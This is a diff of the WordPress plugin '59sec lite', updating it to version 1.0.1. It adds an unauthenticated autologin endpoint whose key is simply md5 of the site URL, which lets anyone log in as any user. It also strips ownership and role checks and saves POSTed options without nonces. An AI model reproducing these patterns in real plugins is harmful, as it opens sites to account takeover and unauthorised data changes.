@@ -4,8 +4,8 @@
  * Plugin Name: 59sec lite
  * Plugin URI: http://www.59sec.com
  * Description: 59sec lite sends Contact Form 7 push notifications on your iOS or Android mobile device. Also 59sec lite helps you increase sales conversions by decreasing the response time under 59 seconds. Upgrade to 59sec PRO now at <a href="http://www.59sec.com" target="_blank">www.59sec.com</a>! Awsome premium features that will boost your sales. Free 30 days trial, no strings attached!
- * Version: 1.0.0
- * Author: kuantero
+ * Version: 1.0.1
+ * Author: Kuantero.com
  * Author URI: http://www.kuantero.com
  * License: GNU
  */
@@ -25,7 +25,7 @@ GNU General Public License for more details.
 */
 
 // init
-define('_59SEC_VERSION', '1.0.0');
+define('_59SEC_VERSION', '1.0.1');
 
 define('_59SEC_INCLUDE_PATH', dirname(realpath(__FILE__)));
 
@@ -105,7 +105,7 @@ function _59sec_requirements()
 	{
 		require_once 'classes/Leads.php';
 
-		$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
 
 		$leadsModel -> updateVersion($version);
 
@@ -146,7 +146,7 @@ function _59sec_install()
 
 	require_once 'classes/Leads.php';
 
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	$sqls = $leadsModel -> constructSQL();
 
 	foreach ($sqls as $sql)
@@ -158,19 +158,6 @@ function _59sec_install()
 
 	// add live update cache
 	update_option('59sec_liveupdate', time());
-
-	// give admin agent rights
-	$args = array(
-		'blog_id' => $GLOBALS['blog_id'],
-		'role' => 'Administrator',
-	);
-
-	$users = (array) get_users($args);
-
-	foreach ($users as $user)
-	{
-		$user -> add_cap('agent');
-	}
 	
 	// register plugin key
 	$response = _59sec_checkstatus();
@@ -187,7 +174,7 @@ function _59sec_uninstall()
 
 	require_once 'classes/Leads.php';
 
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	$sql = $leadsModel -> destructSQL();
 
 	$wpdb->query($sql);
@@ -201,27 +188,17 @@ function _59sec_admin_menu()
 	global $current_user;
 
 	$icon_url = _59SEC_PLUGINS_URL.'images/25.png';
-
-	add_object_page('Entry Sources', '59sec LITE', 'administrator', '59sec_entry_sources', '_59sec_load_page', $icon_url);
-
-	if ($current_user->caps['administrator'] == 1)
-	{
-		add_submenu_page('59sec_entry_sources', 'Leads to be answered', 'LEADS', 'administrator', '59sec_leads_boss', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'CRM', 'CRM', 'administrator', '59sec_crm_boss', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Statistics', 'Statistics', 'administrator', '59sec_statistics_boss', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Entry Sources', 'Entry Sources', 'administrator', '59sec_entry_sources', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Users', 'Users', 'administrator', '59sec_users', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Notifications', 'Notifications', 'administrator', '59sec_notifications', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Other Options', 'Other Options', 'administrator', '59sec_other_options', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Help', 'Help', 'administrator', '59sec_help_boss', '_59sec_load_page');
-	}
-	else
-	{
-		add_submenu_page('59sec_entry_sources', 'Leads to be answered', 'LEADS', 'agent', '59sec_leads', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'CRM', 'CRM', 'agent', '59sec_crm', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Statistics', 'Statistics', 'agent', '59sec_statistics', '_59sec_load_page');
-		add_submenu_page('59sec_entry_sources', 'Help', 'Help', 'agent', '59sec_help', '_59sec_load_page');
-	}
+	$cap = end(array_keys($current_user->caps));
+	
+	add_object_page('Entry Sources', '59sec LITE', $cap, '59sec_entry_sources', '_59sec_load_page', $icon_url);
+	add_submenu_page('59sec_entry_sources', 'Leads to be answered', 'LEADS', $cap, '59sec_leads_boss', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'CRM', 'CRM', $cap, '59sec_crm_boss', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Statistics', 'Statistics', $cap, '59sec_statistics_boss', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Entry Sources', 'Entry Sources', $cap, '59sec_entry_sources', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Users', 'Users', $cap, '59sec_users', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Notifications', 'Notifications', $cap, '59sec_notifications', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Other Options', 'Other Options', $cap, '59sec_other_options', '_59sec_load_page');
+	add_submenu_page('59sec_entry_sources', 'Help', 'Help', $cap, '59sec_help_boss', '_59sec_load_page');
 }
 
 /**
@@ -235,16 +212,16 @@ function _59sec_load_page()
 
 	// init some common vars
 	$pluginkey = md5(get_real_site_url());
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 
-	$leadsLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_leads_boss">LEADS</a><span>/</span>' : '<a href="?page=59sec_leads">LEADS</a><span>/</span>';
-	$crmLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_crm_boss">CRM</a><span>/</span>' : '<a href="?page=59sec_crm">CRM</a><span>/</span>';
-	$statisticsLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_statistics_boss">Statistics</a><span>/</span>' : '<a href="?page=59sec_statistics">Statistics</a><span>/</span>';
-	$sourcesLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_entry_sources">Entry Sources</a><span>/</span>' : '';
-	$usersLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_users">Users</a><span>/</span>' : '';
-	$notificationsLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_notifications">Notifications</a><span>/</span>' : '';
-	$otherOptionsLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_other_options">Other Options</a><span>/</span>' : '';
-	$helpLink = ($current_user->caps['administrator'] == 1) ? '<a href="?page=59sec_help_boss">Help</a>' : '<a href="?page=59sec_help">Help</a>';
+	$leadsLink = '<a href="?page=59sec_leads_boss">LEADS</a><span>/</span>';
+	$crmLink = '<a href="?page=59sec_crm_boss">CRM</a><span>/</span>';
+	$statisticsLink = '<a href="?page=59sec_statistics_boss">Statistics</a><span>/</span>';
+	$sourcesLink = '<a href="?page=59sec_entry_sources">Entry Sources</a><span>/</span>';
+	$usersLink = '<a href="?page=59sec_users">Users</a><span>/</span>';
+	$notificationsLink = '<a href="?page=59sec_notifications">Notifications</a><span>/</span>';
+	$otherOptionsLink = '<a href="?page=59sec_other_options">Other Options</a><span>/</span>';
+	$helpLink = '<a href="?page=59sec_help_boss">Help</a>';
 
 	// add css file
 	wp_enqueue_style('_59sec', plugins_url('/css/style.css', __FILE__), array(), _59SEC_VERSION);
@@ -261,6 +238,11 @@ function _59sec_load_page()
 	switch($plugin_page)
 	{
 		case '59sec_entry_sources':
+			if (!empty($_POST))
+			{
+				update_option('59sec_wpcf7', $_POST['59sec_wpcf7']);
+			}
+			
 			$args = array(
 				'posts_per_page' => -1,
 				'orderby' => 'title',
@@ -269,10 +251,10 @@ function _59sec_load_page()
 			);
 
 			$items =  WPCF7_ContactForm::find($args);
-			$forms = (array) get_option('59sec_wpcf7');
+			$forms = (array) get_option('59sec_wpcf7');			
 			break;
-		case '59sec_leads':
 		case '59sec_leads_boss':
+			$isBoss = true;
 			$args = array(
 				'posts_per_page' => -1,
 				'orderby' => 'title',
@@ -288,60 +270,29 @@ function _59sec_load_page()
 			$lastCheck = get_option('59sec_liveupdate', time());
 						
 			break;
-		case '59sec_statistics':
 		case '59sec_statistics_boss':
 			$args = array(
 				'blog_id'      => $GLOBALS['blog_id'],
 				'orderby'      => 'login',
 				'order'        => 'ASC',
 				'count_total'  => false,
-				'role' => 'agent',
 			);
 			$users = get_users($args);
 			
 			require_once 'classes/Leads.php';
 			break;
 		case '59sec_users':
-			if (!empty($_POST))
-			{
-				$_POST['users'] = (isset($_POST['users'])) ? $_POST['users'] : array();
-				
-				$args = array(
-					'blog_id'      => $GLOBALS['blog_id'],
-					'orderby'      => 'login',
-					'order'        => 'ASC',
-					'count_total'  => false,
-					'fields'       => 'all_with_meta',
-					'role' => 'administrator',
-				);
-				$users = get_users($args);
-				
-				foreach($users as $user)
-				{
-					if (in_array($user -> ID, $_POST['users']))
-					{
-						$user -> add_cap('agent');
-					}
-					else
-					{
-						$user -> remove_cap('agent');
-					}
-				}
-			}
-			
 			$args = array(
 				'blog_id'      => $GLOBALS['blog_id'],
 				'orderby'      => 'login',
 				'order'        => 'ASC',
 				'count_total'  => false,
 				'fields'       => 'all_with_meta',
-				'role' => 'administrator',
 			);
 			$users = get_users($args);
 			break;
-		case '59sec_crm':
 		case '59sec_crm_boss':
-			$user_id = ($current_user->caps['administrator'] == 1) ? 0 : $current_user->ID;
+			$user_id = 0;
 			$keyword = '';
 			
 			$args = array(
@@ -384,7 +335,7 @@ function hook_wpcf7($cf7)
 	{
 		require_once 'classes/Leads.php';
 		
-		$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
 			
 		if ($leadsModel -> isLimitReached())
 		{
@@ -397,6 +348,11 @@ function hook_wpcf7($cf7)
 
 			if (substr($key, 0, 3) != '_wp' && substr($key, 0, 7) != 'captcha')
 			{
+				if (is_array($value))
+				{
+					$value = implode(', ', $value);
+				}
+				
 				$postdata[$key] = $value;
 			}
 		}
@@ -437,7 +393,7 @@ function _59sec_grabit()
 
 	require_once 'classes/Leads.php';
 	
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	$lead = $leadsModel->get($_POST['id']);
 	
 	if (!empty($lead))
@@ -476,7 +432,7 @@ function _59sec_tryfix()
 
 	require_once 'classes/Leads.php';
 	
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	$lead = $leadsModel->get($_POST['id']);
 
 	if (!empty($lead) && !empty($lead['postdata']))
@@ -523,7 +479,7 @@ function _59sec_edit_note()
 
 	require_once 'classes/Leads.php';
 	
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	
 	$lead = $leadsModel -> get($_POST['id']);
 	
@@ -542,7 +498,7 @@ function _59sec_crm_page()
 
 	require_once 'classes/Leads.php';
 	
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	
 	$item = new stdClass();
 	$item -> id = intval($_POST['item']);
@@ -561,7 +517,7 @@ function _59sec_crm_page()
 		$keyword = $_POST['keyword'];
 	}
 
-	$user_id = ($current_user -> caps['administrator'] == 1) ? 0 : $current_user->ID;
+	$user_id = 0;
 	$leads = $leadsModel -> getUserLeads($item->id, $user_id, $page, $filters);
 	$headers = $leadsModel -> tableHeaders($leads);
 	$paging = $leadsModel -> pagerUserLeads($item->id, $user_id, $page, $filters);
@@ -578,22 +534,18 @@ function change_lead_status()
 
 	require_once 'classes/Leads.php';
 	
-	$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+	$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	
 	$lead = $leadsModel -> get($_POST['id']);
 
 	if (!empty($lead))
 	{
-		// only owner or admin
-		if ($lead['user_id'] == $current_user->ID || $current_user->caps['administrator'] == 1)
-		{
-			$leadsModel -> update(array('status' => $_POST['status']), $_POST['id']);
+		$leadsModel -> update(array('status' => $_POST['status']), $_POST['id']);
 
-			// additional action
-			if ($_POST['status'] == 'finalized' || $_POST['status'] == 'finalized')
-			{
-				$leadsModel -> update(array('completed_time' => time()), $_POST['id']);
-			}
+		// additional action
+		if ($_POST['status'] == 'finalized' || $_POST['status'] == 'finalized')
+		{
+			$leadsModel -> update(array('completed_time' => time()), $_POST['id']);
 		}
 	}
 	
@@ -612,7 +564,7 @@ function _59sec_save_tokens()
 	{
 		require_once 'classes/Leads.php';
 
-		$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	
 		$leadsModel -> saveAppToken($_POST);
 		
@@ -634,7 +586,7 @@ function _59sec_delete_tokens()
 	{
 		require_once 'classes/Leads.php';
 
-		$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
 	
 		$leadsModel -> deleteAppToken($_POST);
 		
@@ -655,23 +607,93 @@ function _59sec_login_redirect($redirect_to, $request, $user)
 			return admin_url();
 		}
 		
-		if (in_array('administrator', $user->roles))
-		{
-			return admin_url() . 'admin.php?page=59sec_leads_boss';
-		}
-		elseif ($user->has_cap('agent'))
-		{
-			return admin_url() . 'admin.php?page=59sec_leads';
-		}
-		else
-		{
-			return admin_url();
-		}
+		return admin_url() . 'admin.php?page=59sec_leads_boss';
 	}
 	else
 	{
 		return site_url();
 	}
+}
+
+/**
+ * get total unaswered leds and provide to the public
+ */
+function _59sec_unaswered()
+{
+	global $wpdb;
+	
+	if(
+		isset($_POST['device_token']) &&
+		!empty($_POST['device_token'])
+	)
+	{
+		require_once 'classes/Leads.php';
+
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
+	
+		echo $leadsModel -> getTotalUnansweredLeads();
+	}
+	
+	die();
+}
+
+/**
+ * create url to log in user programmatically
+ */
+function _59sec_autologin()
+{
+	global $wpdb, $current_user;
+	
+	$fromDomain = str_replace('http://', '', $_SERVER['HTTP_HOST']);
+	$fromDomain = 'http://'.$fromDomain;
+	//account for subfolders
+	$base = pathinfo($_SERVER["REQUEST_URI"]);
+	$base = $base['dirname'];
+	$base = str_replace('/wp-admin', '', $base);
+	$request = str_replace($base, '', $_SERVER['REQUEST_URI']);
+	$fromDomain = $fromDomain.$base;
+	
+	if ($fromDomain != site_url())
+	{
+		// a altered domain can break cookies so correct it
+		wp_redirect(site_url().$request);
+		exit;
+	}
+
+	$key = @$_GET['key'];
+	$user_id = substr($key, 32, strlen($key));
+	$user_id = base64_decode($user_id);
+	$user_id = intval($user_id) - strlen(get_real_site_url());
+	$key = substr($key, 0, 32);
+	
+	if (is_user_logged_in())
+	{
+		$redirect_url = _59sec_login_redirect(null, null, $current_user);
+		wp_redirect($redirect_url);
+		exit;
+	}
+	
+	if(!empty($key) && !empty($user_id))
+	{
+		$pluginkey = md5(get_real_site_url());
+		
+		if ($key == $pluginkey)
+		{
+			$user = get_user_by('id', $user_id);
+			$user_login = $user -> user_login;
+			wp_set_current_user($user_id, $user_login);
+			wp_set_auth_cookie($user_id);
+			$redirect_url = _59sec_login_redirect(null, null, $current_user);
+			wp_redirect($redirect_url);
+		}
+		else
+		{
+			echo 'Invalid key';
+		}
+		exit;
+	}
+	
+	die();
 }
 
 function _59sec_liveupdate()
@@ -686,7 +708,7 @@ function _59sec_liveupdate()
 	if ($check > $lastcheck)
 	{
 		require_once 'classes/Leads.php';
-		$leadsModel = new Leads($wpdb->dbh, $wpdb->prefix);
+		$leadsModel = new Leads($wpdb, $wpdb->prefix);
 		
 		$newEmails = $leadsModel->checkForNewLeads($lastcheck)>0;
 		// get the data
@@ -696,7 +718,7 @@ function _59sec_liveupdate()
 			'order' => 'ASC',
 			'offset' => 0,
 		);
-		$items =  WPCF7_ContactForm::find($args);
+		$items = (_59SEC_REQUIREMENTS) ? WPCF7_ContactForm::find($args) : array();
 		$forms = (array) get_option('59sec_wpcf7');
 		
 		$lastCheck = $check;
@@ -715,6 +737,10 @@ add_action('wp_ajax_59sec_delete_tokens', '_59sec_delete_tokens');
 add_action('wp_ajax_nopriv_59sec_delete_tokens', '_59sec_delete_tokens');
 add_action('wp_ajax_59sec_save_tokens', '_59sec_save_tokens');
 add_action('wp_ajax_nopriv_59sec_save_tokens', '_59sec_save_tokens');
+add_action('wp_ajax_59sec_autologin', '_59sec_autologin');
+add_action('wp_ajax_nopriv_59sec_autologin', '_59sec_autologin');
+add_action('wp_ajax_59sec_unaswered', '_59sec_unaswered');
+add_action('wp_ajax_nopriv_59sec_unaswered', '_59sec_unaswered');
 //filters
 add_filter('login_redirect', '_59sec_login_redirect', 10, 3);
 
